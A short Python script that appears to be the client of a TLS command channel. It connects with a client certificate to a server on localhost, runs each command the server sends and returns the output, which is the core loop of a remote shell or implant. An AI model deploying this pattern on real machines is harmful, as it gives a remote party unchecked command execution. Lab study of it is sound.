from client.client import SSLClient


def main():

    client = SSLClient(
        server_host="127.0.0.1",
        server_port=8888,
        sni_hostname="localhost",
        client_cert="../../certs/cert.pem",
        client_key="../../certs/key.pem",
    )

    client.connect()

    print("Connected to server")

    while True:

        command = client.receive()

        if command is None:
            print("Server disconnected")
            break

        print(f"Received command: {command}")

        result = client.execute_command(command)

        client.send(result)

    client.close()


if __name__ == "__main__":
    main()
